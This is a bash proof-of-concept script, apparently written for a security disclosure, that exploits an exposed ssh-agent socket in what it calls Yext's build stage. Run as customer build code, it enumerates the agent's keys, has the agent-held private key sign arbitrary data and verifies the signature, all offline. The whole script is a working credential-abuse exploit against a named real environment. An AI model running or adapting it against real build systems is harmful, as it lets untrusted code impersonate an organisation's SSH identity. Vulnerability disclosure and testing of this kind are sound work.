#!/usr/bin/env bash
# SIGNING-CAPABILITY proof for the build-stage ssh-agent exposure.
# ZERO NETWORK: no GitHub, no authentication, no repository access.
# ssh-keygen -Y sign uses the AGENT-held private key given only its public half,
# so a returned SSH SIGNATURE block proves customer code can make Yext's key
# sign arbitrary data -- i.e. it COMMANDS the identity, not merely enumerates it.
set +e
B="YEXTSIGN"; echo "$B-BEGIN"
echo "$B id=$(id)"
echo "$B SSH_AUTH_SOCK=${SSH_AUTH_SOCK:-UNSET}"
echo "$B sock_ls=$(ls -la "$SSH_AUTH_SOCK" 2>&1)"
echo "$B-AGENT-START"
echo "-- ssh-add -l --"; ssh-add -l 2>&1
echo "-- ssh-add -L --"; ssh-add -L 2>&1
echo "$B-AGENT-END"
echo "$B-SIGN-START"
ssh-add -L > /tmp/yextsign.pub 2>&1
echo "$B pubkey_bytes=$(wc -c < /tmp/yextsign.pub 2>&1)"
printf 'YEXTSIGN-sigtest-7731' | ssh-keygen -Y sign -f /tmp/yextsign.pub -n file - 2>&1
echo "$B sign_exit=$?"
echo "$B-SIGN-END"
echo "$B-VERIFY-START"
# verify the signature offline against the agent's own public key (still zero network)
printf 'YEXTSIGN-sigtest-7731' | ssh-keygen -Y sign -f /tmp/yextsign.pub -n file - > /tmp/yextsign.sig 2>/dev/null
awk '{print "yextci " $0}' /tmp/yextsign.pub > /tmp/yextsign.allowed 2>/dev/null
printf 'YEXTSIGN-sigtest-7731' | ssh-keygen -Y verify -f /tmp/yextsign.allowed -I yextci -n file -s /tmp/yextsign.sig 2>&1
echo "$B verify_exit=$?"
echo "$B-VERIFY-END"
echo "$B-END"; exit 0
